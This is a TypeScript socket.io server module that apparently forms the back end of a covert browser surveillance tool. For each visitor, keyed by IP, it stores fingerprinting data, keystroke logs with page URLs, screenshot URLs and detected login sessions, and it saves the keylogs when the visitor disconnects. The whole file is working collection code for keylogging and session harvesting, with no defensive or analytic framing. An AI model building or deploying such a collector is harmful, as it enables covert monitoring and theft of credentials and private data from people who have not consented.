import { Socket } from "socket.io"
import { UAParser } from "ua-parser-js"

import { Guest } from "./datastore"


export default async (socket:Socket) => {
    const ip = socket.handshake.address
    const sessionId = socket.id
    const keyLog:KeyLog = {url: '', log: '', date: new Date()}

    socket.on('new guest', () => socket.join('guests'))

    socket.on('general info', async (info:GeneralInfo) => {
        const guest:Guest = await Guest.findOne({ ip })
        const navigator = new UAParser(info.userAgent)

        if (guest) {
            Object
                .entries(info)
                .forEach(([key, value]) => { if (key !== 'userAgent') guest[key] = value })

            guest.sessionId = sessionId
            guest.os = `${navigator.getOS().name} ${navigator.getOS().version}`,
            guest.browser = `${navigator.getBrowser().name} ${navigator.getBrowser().version}`,
            guest.browserEngine = `${navigator.getEngine().name} ${navigator.getEngine().version}`,
            guest.cpuArch = navigator.getCPU().architecture

            await guest.save()
        }
    })

    socket.on('network speed', async (networkSpeed:NetworkSpeed) => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest) {
            guest.networkSpeed = networkSpeed
            await guest.save()
        }
    })

    socket.on('key log', (url:string, log:string) => {
        keyLog.url = url
        keyLog.log = log
    })

    socket.on('receive screenshot', async (url:string) => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest && !guest.screenshots.includes(url)) {
            guest.screenshots.push(url)
            await guest.save()
        }
    })

    socket.on('detected sessions', async (sessions:Sessions) => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest) {
            guest.sessions = sessions
            await guest.save()
        }
    })

    socket.on('disconnect', async () => {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest && keyLog.log) {
            guest.keyLogs.push(keyLog)
            await guest.save()
        }
    })
}
